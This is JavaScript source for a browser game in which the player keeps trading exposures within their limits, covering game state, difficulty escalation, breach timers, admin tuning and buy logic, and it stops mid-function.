let trades = window.trades || 0;
let breaches = window.breaches || 0;
let gameTime = window.gameTime || 0;
let missedTimers = window.missedTimers || 0;
let escalationTimer = window.escalationTimer || 0;
let sessionBreachesFixed = window.sessionBreachesFixed || 0;

// Game control variables
let isPaused = window.isPaused || false;
let gameSpeed = window.gameSpeed || 700;
let gameDifficulty = window.gameDifficulty || 2;

// Breach tracking per asset class
let assetClassBreaches = window.assetClassBreaches || {
    indices: new Set(),
    forex: new Set(),
    shares: new Set(),
    commodities: new Set(),
    crypto: new Set()
};

let expiredBreaches = window.expiredBreaches || {
    indices: new Set(),
    forex: new Set(),
    shares: new Set(),
    commodities: new Set(),
    crypto: new Set()
};

let assetClassTimers = window.assetClassTimers || {
    indices: {},
    forex: {},
    shares: {},
    commodities: {},
    crypto: {}
};

// Current view breach tracking
let breachedMarkets = window.breachedMarkets || new Set();
let individualBreachTimers = window.individualBreachTimers || {};
let hasActiveBreach = window.hasActiveBreach || false;

// Game loop intervals
let gameInterval = window.gameInterval;
let timerInterval = window.timerInterval;
let powerupInterval = window.powerupInterval;

// Centralized interval management
function clearAllIntervals() {
    if (gameInterval) {
        clearInterval(gameInterval);
        gameInterval = null;
    }
    if (timerInterval) {
        clearInterval(timerInterval);
        timerInterval = null;
    }
    if (powerupInterval) {
        clearInterval(powerupInterval);
        powerupInterval = null;
    }
}

// Admin panel state
let showAdminPanel = window.showAdminPanel || false;

// Game initialization functions
function initializeAllAssetClasses() {
    Object.keys(marketData).forEach(assetClass => {
        // Only initialize exposures for unlocked asset classes
        if (userProfile.unlockedAssets.includes(assetClass)) {
            marketData[assetClass].forEach(market => {
                const randomPercent = Math.random() * 0.5;
                const randomDirection = Math.random() < 0.5 ? -1 : 1;
                market.exposure = market.limit * randomPercent * randomDirection;
                market.trend = 0; // Reset trends as well
            });
        } else {
            // For locked asset classes, set exposures to 0
            marketData[assetClass].forEach(market => {
                market.exposure = 0;
                market.trend = 0;
            });
        }
    });
}

function initializeEverything() {
    // Ensure markets is properly initialized
    if (!markets || markets.length === 0) {
        markets = marketData[currentAssetClass];
    }
    

    initializeAllAssetClasses();
    updateMenuDisplay(); // Defined in UI module
    updateUnlockedAssets(); // Defined in UI module
    loadAdminPanelValues(); // Defined in UI module
    
    
    safeUpdateElement('levelEditor', userProfile.level, 'value'); // Defined in UI module
    safeUpdateElement('coinsEditor', userProfile.coins, 'value'); // Defined in UI module
}

function resetToDefaults() {
    if (isGuestMode || !currentUser) {
        userProfile = initializeDefaultProfile();
        updateMenuDisplay(); // Defined in UI module
        updateProfileDisplay(); // Defined in UI module
    }
    // If user is logged in, don't reset their data
}

// Game state reset functions
function resetGameState() {
    // Reset all game variables without awarding XP/coins again
    Object.keys(activePowerups).forEach(powerupType => {
        activePowerups[powerupType] = { active: false, timeLeft: 0, cooldown: 0 };
    });

    // Ensure markets is properly initialized
markets = marketData[currentAssetClass];
    
    score = 0;
    trades = 0;
    breaches = 0;
    gameTime = 0;
    missedTimers = 0;
    escalationTimer = 0;
    sessionBreachesFixed = 0;
    adminSettings.globalVolatilityMultiplier = baseGlobalVolatility;
    updateGlobalVolatilityDisplay(); // Defined in UI module
    breachedMarkets.clear();
    individualBreachTimers = {};
    hasActiveBreach = false;

    Object.keys(assetClassBreaches).forEach(assetClass => {
        assetClassBreaches[assetClass].clear();
        assetClassTimers[assetClass] = {};
    });

    Object.keys(expiredBreaches).forEach(assetClass => {
        expiredBreaches[assetClass].clear();
    });

    updateScore(); // Defined in UI module
    updateDisplay(); // Defined in markets module
    updateProfileDisplay(); // Defined in UI module
    updateUnlockedAssets(); // Defined in UI module
    updatePowerupsDisplay(); // Defined in powerups module
    updateStrikesDisplay(); // Defined in UI module
}

// Game flow control
function startGame() {
    // Clear any existing intervals first
    clearAllIntervals();
 
    initializeAllAssetClasses();
    
    const menuScreen = document.getElementById('menuScreen');
    menuScreen.style.display = 'none';
    menuScreen.style.visibility = 'hidden';
    menuScreen.style.position = 'absolute';
    menuScreen.style.top = '-9999px';
    document.getElementById('gameScreen').style.display = 'block';
    currentView = 'markets';
    document.getElementById('powerupsContainer').style.display = 'none';
    document.getElementById('marketsContainer').style.display = 'block';
    
    document.querySelectorAll('.tab-button').forEach(tab => {
        tab.classList.remove('active');
    });
    // Highlight the tab for the current asset class instead of always highlighting the first one
    const targetTab = document.querySelector(`.tab-button[onclick*="'${currentAssetClass}'"]`);
    if (targetTab) {
        targetTab.classList.add('active');
    }
    
    // Reset game state
    score = 0;
    trades = 0;
    breaches = 0;
    gameTime = 0;
    missedTimers = 0;
    escalationTimer = 0;
    sessionBreachesFixed = 0;
    isPaused = false; // Reset pause state
    adminSettings.globalVolatilityMultiplier = baseGlobalVolatility;
    updateGlobalVolatilityDisplay(); // Defined in UI module
    
    // Reset pause button state
    const btn = document.getElementById('pauseBtn');
    btn.textContent = 'Pause';
    btn.className = 'control-btn';
    
    // Clear all breach tracking
    Object.keys(assetClassBreaches).forEach(assetClass => {
        assetClassBreaches[assetClass].clear();
        assetClassTimers[assetClass] = {};
    });
    breachedMarkets.clear();
    individualBreachTimers = {};
    hasActiveBreach = false;

    Object.keys(expiredBreaches).forEach(assetClass => {
        expiredBreaches[assetClass].clear();
    });

    // Reset powerups
    Object.keys(activePowerups).forEach(powerupType => {
        activePowerups[powerupType] = { active: false, timeLeft: 0, cooldown: 0 };
    });
    
    clearAllIntervals();

    // Ensure markets is properly initialized for the current asset class
markets = [...marketData[currentAssetClass]];
    

    gameInterval = setInterval(updateExposures, gameSpeed); // updateExposures defined in markets module
    timerInterval = setInterval(() => {
        if (!isPaused) {
            gameTime++;
            updateBreachTimers(); // Defined in markets module
            handleEscalatingDifficulty();
        }
        updateScore(); // Defined in UI module - always update to show current state
    }, 1000);
    powerupInterval = setInterval(updatePowerupTimers, 1000); // Defined in powerups module
    
    updateStrikesDisplay(); // Defined in UI module
    updateScore(); // Defined in UI module
    const difficultyDisplay = document.getElementById('difficultyDisplay');
    if (difficultyDisplay) {
        difficultyDisplay.textContent = ['Easy', 'Normal', 'Hard'][gameDifficulty - 1];
    }
    initializeGame(); // Defined in markets module
    populateQuickPowerupBar(); // Initialize quick access powerup bar
}

function endGame(message) {
    
    clearAllIntervals();
    
    const gameXP = Math.max(0, Math.floor(score / 10));
    const gameCoins = Math.max(0, Math.floor(score / adminSettings.coinRewards.endGameMultiplier));
    const oldLevel = userProfile.level;
    const wasNewBest = score > userProfile.bestScore;
    
      awardXP(gameXP); // Defined in trading module
    awardCoins(gameCoins); // Defined in trading module
    
    userProfile.gamesPlayed++;
    if (score > userProfile.bestScore) {
        userProfile.bestScore = score;
    }
    if (score > 0) {
        userProfile.wins++;
    }
    
// Save game session data with error handling
if (currentUser && !isGuestMode) {
    try {
        validateAndRepairUserProfile(); // Ensure data integrity before saving
        saveGameSession({
            score: Math.max(0, score),
            duration: Math.max(0, gameTime),
            trades: Math.max(0, trades),
            breaches: Math.max(0, breaches),
            difficulty: Math.max(1, Math.min(3, gameDifficulty))
        });
        saveUserProgress();
    } catch (error) {
        console.error('Failed to save game data:', error);
        // Continue with game over display even if save fails
    }
}
    
       setTimeout(() => {
        showGameOverModal(message, gameXP, gameCoins, oldLevel !== userProfile.level, wasNewBest); // Defined in UI module
    }, 100);
}

// Pause/resume functionality
function togglePause() {
    if (isPaused) {
        resumeGame();
    } else {
        showPauseMenu(); // Defined in UI module
    }
}

function resumeGame() {
    isPaused = false;
    
    // Update pause button state
    const btn = document.getElementById('pauseBtn');
    btn.textContent = 'Pause';
    btn.className = 'control-btn';
    
    // Hide pause menu
    document.getElementById('pauseMenuModal').style.display = 'none';
    
    // Ensure game screen is visible and menu screen is hidden
    document.getElementById('gameScreen').style.display = 'block';
    document.getElementById('menuScreen').style.display = 'none';
    document.getElementById('authScreen').style.display = 'none';
}

function endGameFromPause() {
    // Hide pause menu first
    document.getElementById('pauseMenuModal').style.display = 'none';
    
    // End the game normally - this will show the game over screen
    endGame(`Game ended manually. Final score: ${score}`);
}

function returnToMenu() {
    clearAllIntervals(); // Ensure all intervals are stopped
    
    document.getElementById('gameScreen').style.display = 'none';
    const menuScreen = document.getElementById('menuScreen');
    menuScreen.style.display = 'flex';
    menuScreen.style.visibility = 'visible';
    menuScreen.style.position = 'fixed';
    menuScreen.style.top = '0';
    updateMenuDisplay(); // Defined in UI module
    
    // Auto-save progress when returning to menu
    if (currentUser && !isGuestMode) {
        saveUserProgress();
    }
}

// Difficulty management
function selectMenuDifficulty(difficultyLevel) {
    gameDifficulty = difficultyLevel;
    gameSpeed = gameDifficulty === 1 ? 700 : gameDifficulty === 2 ? 400 : 350;
    
    document.querySelectorAll('.menu-difficulty-pill').forEach(option => {
        option.classList.remove('active');
    });
    document.querySelector(`[data-difficulty="${difficultyLevel}"]`).classList.add('active');
    
    // Update trend strengths for all markets based on new difficulty
    Object.keys(marketData).forEach(assetClass => {
        marketData[assetClass].forEach(market => {
            market.trendStrength = Math.max(market.trendStrength, gameDifficulty === 3 ? 1.75 : 1.5);
        });
    });
}

function ensureDefaultDifficulty() {
    // Only set if no difficulty is currently selected
    const currentlyActive = document.querySelector('.menu-difficulty-pill.active');
    if (!currentlyActive) {
        selectMenuDifficulty(gameDifficulty);
    }
}


function changeDifficulty() {
    gameDifficulty = gameDifficulty >= 3 ? 1 : gameDifficulty + 1;
    gameSpeed = gameDifficulty === 1 ? 700 : gameDifficulty === 2 ? 400 : 350;
        
    Object.keys(marketData).forEach(assetClass => {
        marketData[assetClass].forEach(market => {
            market.trendStrength = Math.max(market.trendStrength, gameDifficulty === 3 ? 1.75 : 1.5);
        });
    });
    
    document.getElementById('difficultyDisplay').textContent = ['Easy', 'Normal', 'Hard'][gameDifficulty - 1];
    
    clearAllIntervals();
    
    gameInterval = setInterval(() => {
        updateExposures(); // Defined in markets module
    }, gameSpeed);
    
    timerInterval = setInterval(() => {
        if (!isPaused) {
            gameTime++;
            updateBreachTimers(); // Defined in markets module
            handleEscalatingDifficulty();
        }
        updateScore(); // Defined in UI module
    }, 1000);
    powerupInterval = setInterval(updatePowerupTimers, 1000); // Defined in powerups module
}

// Escalating difficulty system
function handleEscalatingDifficulty() {
    if (isPaused || !gameEndSettings.enableEscalatingDifficulty) return;
    
    escalationTimer++;
    if (escalationTimer >= gameEndSettings.escalationInterval) {
        // Use difficulty-based escalation amount
        const escalationAmount = gameDifficulty === 1 ? 0.25 : gameDifficulty === 2 ? 0.5 : 0.75;
        adminSettings.globalVolatilityMultiplier += escalationAmount;
        escalationTimer = 0;
        
        let notification = document.createElement('div');
        notification.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            background: linear-gradient(135deg, #ff5722, #d84315);
            color: white;
            padding: 12px 20px;
            border-radius: 8px;
            font-weight: bold;
            z-index: 1500;
            border: 1px solid rgba(255,255,255,0.3);
            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
        `;
        notification.textContent = `Market volatility increased! (${adminSettings.globalVolatilityMultiplier.toFixed(1)}x)`;
        document.body.appendChild(notification);
        
        const cleanupNotification = () => {
            try {
                if (notification && notification.parentNode) {
                    notification.parentNode.removeChild(notification);
                }
            } catch (e) {
                // Silently handle case where element was already removed
            }
            notification = null; // Ensure garbage collection
        };
        
        setTimeout(cleanupNotification, 3000);
        
        // Also cleanup on page unload to prevent memory leaks
        window.addEventListener('beforeunload', cleanupNotification, { once: true });
        
        updateGlobalVolatilityDisplay(); // Defined in UI module
    }
}

// Game end condition checking
function checkGameEndConditions() {
  
    if (gameEndSettings.enableTimeLimit && gameTime >= gameEndSettings.timeLimitMinutes * 60) {
        endGame(`Time's up! Final score: ${score}`);
        return true;
    }
    
    if (gameEndSettings.enableMissedTimerLimit && missedTimers >= gameEndSettings.maxMissedTimers) {
        endGame(`Game Over! You missed ${gameEndSettings.maxMissedTimers} breach timers. Final score: ${score}`);
        return true;
    }
    
    return false;
}

// Reset game functionality (for the "Reset" button in-game)
function resetGame() {
    Object.keys(expiredBreaches).forEach(assetClass => {
        expiredBreaches[assetClass].clear();
    });
    
    const gameXP = Math.max(0, Math.floor(score / 10));
    const gameCoins = Math.max(0, Math.floor(score / adminSettings.coinRewards.endGameMultiplier));
    awardXP(gameXP); // Defined in trading module
    awardCoins(gameCoins); // Defined in trading module
    
    if (breaches === 0 && gameTime > 30) {
        awardCoins(adminSettings.coinRewards.perfectGameBonus); // Defined in trading module
        awardXP(25); // Defined in trading module
    }
    
    Object.keys(activePowerups).forEach(powerupType => {
        activePowerups[powerupType] = { active: false, timeLeft: 0, cooldown: 0 };
    });
    
    initializeAllAssetClasses();
    markets = marketData[currentAssetClass];
    
    score = 0;
    trades = 0;
    breaches = 0;
    gameTime = 0;
    missedTimers = 0;
    escalationTimer = 0;
    sessionBreachesFixed = 0;
    adminSettings.globalVolatilityMultiplier = baseGlobalVolatility;
    updateGlobalVolatilityDisplay(); // Defined in UI module
    breachedMarkets.clear();
    individualBreachTimers = {};
    hasActiveBreach = false;
    
    Object.keys(assetClassBreaches).forEach(assetClass => {
        assetClassBreaches[assetClass].clear();
        assetClassTimers[assetClass] = {};
    });
    
    updateScore(); // Defined in UI module
    updateDisplay(); // Defined in markets module
    updateProfileDisplay(); // Defined in UI module
    updateUnlockedAssets(); // Defined in UI module
    updatePowerupsDisplay(); // Defined in powerups module
    updateStrikesDisplay(); // Defined in UI module
}

// Admin panel functions
function toggleAdminPanel() {
    showAdminPanel = !showAdminPanel;
    const panel = document.getElementById('adminPanel');
    panel.style.display = showAdminPanel ? 'block' : 'none';
    if (showAdminPanel) {
        updateGlobalVolatilityDisplay(); // Defined in UI module
        loadAdminPanelValues(); // Defined in UI module
    }
}

function updateAdminSetting(setting, value) {
    const numValue = parseFloat(value);
    if (!isNaN(numValue)) {
        adminSettings[setting] = numValue;
        
        if (setting === 'globalVolatilityMultiplier') {
            updateGlobalVolatilityDisplay(); // Defined in UI module
        }
    }
}


function updateAssetSetting(category, assetClass, value) {
    const numValue = parseFloat(value);
    if (!isNaN(numValue)) {
        adminSettings[category][assetClass] = numValue;
    }
}

function updateCoinSetting(setting, value) {
    const numValue = parseFloat(value);
    if (!isNaN(numValue)) {
        adminSettings.coinRewards[setting] = numValue;
    }
}

function updateGameEndSetting(setting, value) {
    const numValue = parseFloat(value);
    if (!isNaN(numValue)) {
        gameEndSettings[setting] = numValue;
    }
}

function toggleGameEndCondition(condition) {
    gameEndSettings[condition] = !gameEndSettings[condition];
    updateGameEndButtons(); // Defined in UI module
}

function resetAdminSettings() {
    adminSettings = {
        breachHedgePoints: 25,
        breachClearBonus: 50,
        goodTradeBonus: 15,
        badTradePenalty: -50,
        worseBreachPenalty: -75,
        causeBreachPenalty: -100,
        timeoutPenalty: -150,
        globalVolatilityMultiplier: 1.0,
        breachTimerSeconds: 10,
        assetVolatilityMultipliers: {
            indices: 1.0,
            forex: 0.6,
            shares: 1.4,
            commodities: 1.2,
            crypto: 2.0
        },
        coinRewards: {
            goodTrade: 1,
            breachHedge: 2,
            breachClear: 8,
            endGameMultiplier: 20,
            perfectGameBonus: 50,
            levelUpBonus: 25
        }
    };
        
    // Safely update admin panel inputs
    const adminInputs = [
        'breachHedgePoints', 'breachClearBonus', 'goodTradeBonus', 'badTradePenalty',
        'worseBreachPenalty', 'causeBreachPenalty', 'timeoutPenalty', 'globalVolatilityMultiplier',
        'breachTimerSeconds', 'goodTradeCoins', 'breachHedgeCoins', 'breachClearCoins',
        'endGameDivisor', 'perfectGameCoins', 'levelUpCoins'
    ];
    
    adminInputs.forEach(inputId => {
        const element = document.getElementById(inputId);
        if (element) {
            if (inputId.includes('Coins') || inputId.includes('Divisor')) {
                element.value = adminSettings.coinRewards[inputId.replace('Coins', '').replace('Divisor', 'Multiplier')] || adminSettings.coinRewards.endGameMultiplier;
            } else {
                element.value = adminSettings[inputId];
            }
        }
    });
    
    Object.keys(adminSettings.assetVolatilityMultipliers).forEach(assetClass => {
        const volInput = document.getElementById(`${assetClass}VolatilityMultiplier`);
        if (volInput) volInput.value = adminSettings.assetVolatilityMultipliers[assetClass];
    });
}

// Utility function for time formatting
function formatTime(seconds) {
    const minutes = Math.floor(seconds / 60);
    const remainingSeconds = seconds % 60;
    if (minutes > 0) {
        return `${minutes}m ${remainingSeconds}s`;
    }
    return `${remainingSeconds}s`;
}

// Export to global scope to prevent redeclaration conflicts
window.currentAssetClass = currentAssetClass;
window.currentView = currentView;
window.markets = markets;
window.score = score;
window.trades = trades;
window.breaches = breaches;
window.gameTime = gameTime;
window.missedTimers = missedTimers;
window.escalationTimer = escalationTimer;
window.sessionBreachesFixed = sessionBreachesFixed;
window.isPaused = isPaused;
window.gameSpeed = gameSpeed;
window.gameDifficulty = gameDifficulty;
window.assetClassBreaches = assetClassBreaches;
window.expiredBreaches = expiredBreaches;
window.assetClassTimers = assetClassTimers;
window.breachedMarkets = breachedMarkets;
window.individualBreachTimers = individualBreachTimers;
window.hasActiveBreach = hasActiveBreach;
window.gameInterval = gameInterval;
window.timerInterval = timerInterval;
window.powerupInterval = powerupInterval;
window.showAdminPanel = showAdminPanel;
window.initializeAllAssetClasses = initializeAllAssetClasses;
window.initializeEverything = initializeEverything;
window.resetToDefaults = resetToDefaults;
window.resetGameState = resetGameState;
window.startGame = startGame;
window.endGame = endGame;
window.togglePause = togglePause;
window.resumeGame = resumeGame;
window.endGameFromPause = endGameFromPause;
window.returnToMenu = returnToMenu;
window.selectMenuDifficulty = selectMenuDifficulty;
window.changeDifficulty = changeDifficulty;
window.handleEscalatingDifficulty = handleEscalatingDifficulty;
window.checkGameEndConditions = checkGameEndConditions;
window.resetGame = resetGame;
window.toggleAdminPanel = toggleAdminPanel;
window.updateAdminSetting = updateAdminSetting;
window.updateAssetSetting = updateAssetSetting;
window.updateCoinSetting = updateCoinSetting;
window.updateGameEndSetting = updateGameEndSetting;
window.toggleGameEndCondition = toggleGameEndCondition;
window.resetAdminSettings = resetAdminSettings;
window.formatTime = formatTime;
window.ensureDefaultDifficulty = ensureDefaultDifficulty;
window.clearAllIntervals = clearAllIntervals;

// ===== MARKETS_MODULE MODULE =====
// ===== MARKET LOGIC MODULE =====
// Dependencies: config.js (marketData, adminSettings, activePowerups), gameState.js (game variables)
// Exposes: Market display, exposure updates, breach management, asset class switching

// Market display functions
function createMarketRow(market, index) {
    const isFrozen = activePowerups.marketFreeze.active;
    const frozenClass = isFrozen ? 'market-frozen' : '';
    const shieldedClass = activePowerups.volatilityShield.active ? 'volatility-shielded' : '';
    
    return `
        <div class="market-row ${frozenClass} ${shieldedClass}" id="market-${index}">
            <button class="buy-btn" onclick="buyMarket(${index})">BUY</button>
            <div class="exposure-container">
                <div class="exposure-bar green long" id="bar-${index}"></div>
                <div class="breach-countdown" id="countdown-${index}" style="display: none;">
                    <div class="countdown-circle" id="circle-${index}">
                        <div class="countdown-text" id="timer-${index}">0</div>
                    </div>
                </div>
                <div class="market-info">
                    <div class="market-name">${market.name}</div>
                    <div class="market-limit">Limit: ${market.limit}</div>
                    <div class="exposure-value" id="exposure-${index}">0</div>
                </div>
            </div>
            <button class="sell-btn" onclick="sellMarket(${index})">SELL</button>
        </div>
    `;
}

function initializeGame() {
    // Safety check - ensure markets array is properly populated
    if (!markets || markets.length === 0) {
        markets = [...marketData[currentAssetClass]];
    }
    
    markets.forEach(market => {
        if (market.exposure === 0 && market.trend === 0) {
            const randomPercent = Math.random() * 0.5;
            const randomDirection = Math.random() < 0.5 ? -1 : 1;
            market.exposure = market.limit * randomPercent * randomDirection;
        }
    });
    
    const marketsContainer = document.getElementById('markets');
    if (marketsContainer) {
        marketsContainer.innerHTML = markets.map(createMarketRow).join('');
        updateDisplay();
    }
}

function getBarColor(exposure, limit) {
    const absExposure = Math.abs(exposure);
    const ratio = absExposure / limit;
    
    if (ratio >= 1.5) return 'white';
    if (ratio >= 1.0) return 'red';
    if (ratio >= 0.75) return 'yellow';
    return 'green';
}

function updateDisplay() {
    markets.forEach((market, index) => {
        const bar = document.getElementById(`bar-${index}`);
        const exposureDisplay = document.getElementById(`exposure-${index}`);
        const marketRow = document.getElementById(`market-${index}`);
        const countdown = document.getElementById(`countdown-${index}`);
        
        if (!bar) return;
        
        const exposurePercent = Math.min(40, Math.abs(market.exposure) / market.limit * 40);
        const isLong = market.exposure >= 0;
        const barColor = getBarColor(market.exposure, market.limit);
        
        bar.className = `exposure-bar ${isLong ? 'long' : 'short'} ${barColor}`;
        bar.style.width = exposurePercent + '%';
        
        exposureDisplay.textContent = Math.round(market.exposure);
        exposureDisplay.style.color = barColor === 'white' ? '#ffffff' : '#ffeb3b';
        
        const isBreached = Math.abs(market.exposure) >= market.limit;
        const isCritical = Math.abs(market.exposure) >= market.limit * 1.5;
        
        marketRow.className = 'market-row';
        if (activePowerups.marketFreeze.active) {
            marketRow.classList.add('market-frozen');
        }
        if (activePowerups.volatilityShield.active) {
            marketRow.classList.add('volatility-shielded');
        }
        if (isCritical) {
            marketRow.classList.add('critical-warning');
        } else if (isBreached) {
            marketRow.classList.add('warning');
        }
        
        if (isBreached && individualBreachTimers[index] > 0 && !activePowerups.freezeTimer.active) {
            countdown.style.display = 'block';
            const timerText = document.getElementById(`timer-${index}`);
            const circle = document.getElementById(`circle-${index}`);
            const timeLeft = individualBreachTimers[index];
            timerText.textContent = Math.max(0, timeLeft);
            
            const progress = (timeLeft / adminSettings.breachTimerSeconds) * 360;
            circle.style.setProperty('--progress', `${progress}deg`);
        } else {
            countdown.style.display = 'none';
        }
    });
    
    updateBreachBadges();
}

// Market exposure update engine
function updateExposures() {
    if (isPaused || activePowerups.marketFreeze.active) return;
    
    Object.keys(marketData).forEach(assetClass => {
        // Only update exposures for unlocked asset classes
        if (!userProfile.unlockedAssets.includes(assetClass)) return;
        
        // Skip commodities if Trading Places is active
        if (assetClass === 'commodities' && activePowerups.tradingPlaces.active) return;
        
        const assetMarkets = marketData[assetClass];
        
        assetMarkets.forEach((market, marketIndex) => {
            const volatilityMultiplier = adminSettings.assetVolatilityMultipliers[assetClass] || 1.0;
            let effectiveVolatilityMultiplier = volatilityMultiplier;
            
            if (activePowerups.volatilityShield.active) {
                effectiveVolatilityMultiplier *= 0.3;
            }
            
            const baseVolatility = (gameDifficulty === 3 ? 52 : 45) * effectiveVolatilityMultiplier * adminSettings.globalVolatilityMultiplier;
            const trendInfluence = (gameDifficulty === 3 ? 0.72 : 0.65) * market.trendStrength;
            
            const randomComponent = (Math.random() - 0.5) * baseVolatility;
            const trendComponent = market.trend * trendInfluence;
            const change = randomComponent + trendComponent;
            
            market.exposure += change;
            
            const isBreached = Math.abs(market.exposure) >= market.limit;
            const wasAlreadyBreached = assetClassBreaches[assetClass].has(marketIndex);
            
            // Auto-hedge with Nodding Bird
            if (isBreached && activePowerups.noddingBird.active) {
                // Automatically reduce exposure toward zero
                const hedgeAmount = market.exposure * 0.15; // 15% reduction per cycle
                market.exposure -= hedgeAmount;
                score += 5; // Small bonus for auto-hedge
                
                // Check if breach is resolved after auto-hedge
                const isStillBreached = Math.abs(market.exposure) >= market.limit;
                if (!isStillBreached && wasAlreadyBreached) {
                    userProfile.breachesFixed++;
                    sessionBreachesFixed++;
                    awardXP(10); // Defined in trading module
                    awardCoins(adminSettings.coinRewards.breachClear / 2); // Defined in trading module
                }
            }
            
            if (isBreached && !wasAlreadyBreached) {
                assetClassBreaches[assetClass].add(marketIndex);
                // Only create timer if this breach hasn't already expired
                if (!expiredBreaches[assetClass].has(marketIndex)) {
                    assetClassTimers[assetClass][marketIndex] = adminSettings.breachTimerSeconds;
                }
                
                if (assetClass === currentAssetClass) {
                    breachedMarkets.add(marketIndex);
                    if (assetClassTimers[assetClass][marketIndex] > 0) {
                        individualBreachTimers[marketIndex] = assetClassTimers[assetClass][marketIndex];
                    }
                    breaches++;
                    hasActiveBreach = true;
                }
            } else if (!isBreached && wasAlreadyBreached) {
                assetClassBreaches[assetClass].delete(marketIndex);
                delete assetClassTimers[assetClass][marketIndex];
                expiredBreaches[assetClass].delete(marketIndex); // Clear expired status when breach is resolved
                
                if (assetClass === currentAssetClass) {
                    breachedMarkets.delete(marketIndex);
                    delete individualBreachTimers[marketIndex];
                    if (breachedMarkets.size === 0) {
                        hasActiveBreach = false;
                    }
                }
            }
            
            if (Math.random() < 0.1) {
                market.trend = (Math.random() - 0.5) * market.trendStrength * 40;
            }
            
            if (Math.random() < 0.02) {
                market.trend *= -0.5;
            }
            
            market.trend = Math.max(-30, Math.min(30, market.trend));
        });
    });
    
    markets = marketData[currentAssetClass];
    if (currentView === 'markets') {
        updateDisplay();
    }
}

// Asset class switching
function switchAssetClass(assetClass) {
    if (!userProfile.unlockedAssets.includes(assetClass)) {
        alert(`${assetClass.charAt(0).toUpperCase() + assetClass.slice(1)} markets are locked! Visit the shop to unlock them.`);
        return;
    }
    
    currentView = 'markets';
    
    marketData[currentAssetClass] = markets;
    assetClassTimers[currentAssetClass] = {...individualBreachTimers};
    
    currentAssetClass = assetClass;
    if (marketData[assetClass] && Array.isArray(marketData[assetClass])) {
        markets = [...marketData[assetClass]];
    } else {
        console.error('Invalid market data for asset class:', assetClass);
        return;
    }
    
    individualBreachTimers = {...assetClassTimers[assetClass]};
    
    breachedMarkets.clear();
    markets.forEach((market, index) => {
        if (Math.abs(market.exposure) >= market.limit) {
            breachedMarkets.add(index);
        }
    });
    
    hasActiveBreach = Object.keys(individualBreachTimers).length > 0;
    
    document.querySelectorAll('.tab-button').forEach(tab => {
        tab.classList.remove('active');
    });
    // Find the tab button for this asset class and make it active
    const targetTab = document.querySelector(`.tab-button[onclick*="'${assetClass}'"]`);
    if (targetTab) {
        targetTab.classList.add('active');
    }
    
    document.getElementById('powerupsContainer').style.display = 'none';
    document.getElementById('marketsContainer').style.display = 'block';
    
    const marketsContainer = document.getElementById('markets');
    marketsContainer.innerHTML = markets.map(createMarketRow).join('');
    updateDisplay();
}

// Breach timer management
function updateBreachTimers() {
    if (isPaused || activePowerups.freezeTimer.active) return;
    
    Object.keys(assetClassTimers).forEach(assetClass => {
        const timers = assetClassTimers[assetClass];
        Object.keys(timers).forEach(marketIndex => {
            if (timers[marketIndex] > 0) {
                timers[marketIndex]--;
                if (timers[marketIndex] <= 0) {
                    score += adminSettings.timeoutPenalty;
                    missedTimers++;
                    updateStrikesDisplay(); // Defined in UI module
                    
                    // Mark as expired and delete timer
                    expiredBreaches[assetClass].add(parseInt(marketIndex));
                    delete timers[marketIndex];
                }
            }
        });
    });
    
    individualBreachTimers = assetClassTimers[currentAssetClass];
    hasActiveBreach = Object.keys(individualBreachTimers).length > 0;
    updateBreachBadges();
    
    // Check game end conditions and stop processing if game ends
    if (checkGameEndConditions()) { // Defined in gameState module
        return;
    }
}

// Breach badge display management
function updateBreachBadges() {
    Object.keys(marketData).forEach(assetClass => {
        // Only show breach badges for unlocked asset classes
        if (!userProfile.unlockedAssets.includes(assetClass)) {
            const badge = document.getElementById(`badge-${assetClass}`);
            if (badge) {
                badge.style.display = 'none';
            }
            return;
        }
        
        const markets = marketData[assetClass];
        let breachCount = 0;
        
        if (markets && Array.isArray(markets)) {
            markets.forEach(market => {
                if (Math.abs(market.exposure) >= market.limit) {
                    breachCount++;
                }
            });
        }
        
        const badge = document.getElementById(`badge-${assetClass}`);
        if (badge) {
            if (breachCount > 0) {
                badge.textContent = breachCount;
                badge.style.display = 'flex';
            } else {
                badge.style.display = 'none';
            }
        }
    });
}


// Export to global scope
window.createMarketRow = createMarketRow;
window.initializeGame = initializeGame;
window.getBarColor = getBarColor;
window.updateDisplay = updateDisplay;
window.updateExposures = updateExposures;
window.switchAssetClass = switchAssetClass;
window.updateBreachTimers = updateBreachTimers;
window.updateBreachBadges = updateBreachBadges;

// ===== TRADING_MODULE MODULE =====
// ===== TRADING SYSTEM MODULE =====
// Dependencies: config.js (adminSettings, userProfile), gameState.js (score, trades, etc.)
// Exposes: Buy/sell functions, XP/coin rewards, scoring calculations

// Core trading functions
function buyMarket(index) {
    if (isPaused) {
        alert('Cannot trade while game is paused!');
        return;
    }
    
    const market = markets[index];
    const oldAbsExposure = Math.abs(market.exposure);
    const wasBreached = Math.abs(market.exposure) >= market.limit;
        
    market.exposure += market.limit * 0.25;
    
    const newAbsExposure = Math.abs(market.exposure);
    const isNowBreached = Math.abs(market.exposure) >= market.limit;
    
    addTradeEffect(index);
    
    if (wasBreached && newAbsExposure < oldAbsExposure) {
        score += adminSettings.breachHedgePoints;
        trades++;
        userProfile.totalTrades++;
        awardXP(5);
        awardCoins(adminSettings.coinRewards.breachHedge);
        
        if (!isNowBreached) {
            const timeBonus = individualBreachTimers[index] ? Math.max(1, Math.floor(individualBreachTimers[index] / 2)) : 0;
            score += adminSettings.breachClearBonus + timeBonus;
            userProfile.breachesFixed++;
            sessionBreachesFixed++;
            awardXP(15);
            awardCoins(adminSettings.coinRewards.breachClear);
        }
    } else if (!wasBreached && isNowBreached) {
        score += adminSettings.causeBreachPenalty;
    } else if (!wasBreached && !isNowBreached && newAbsExposure < oldAbsExposure) {
        score += adminSettings.goodTradeBonus;
        trades++;
        userProfile.totalTrades++;
        awardXP(3);
        awardCoins(adminSettings.coinRewards.goodTrade);
    } else if (!wasBreached) {
        score += adminSettings.badTradePenalty;
    } else {
        score += adminSettings.worseBreachPenalty;
    }
    
    updateScore(); // Defined in UI module
    updateDisplay(); // Defined in markets module
}

// Data validation utilities
function validateNumericInput(value, min = 0, max = Number.MAX_SAFE_INTEGER) {
    const num = Number(value);
    if (isNaN(num) || !isFinite(num)) {
        return { valid: false, error: 'Invalid number' };
    }
    if (num < min) {
        return { valid: false, error: `Value must be at least ${min}` };
    }
    if (num > max) {
        return { valid: false, error: `Value must be at most ${max}` };
    }
    return { valid: true, value: num };
}

function validateUserData(userData) {
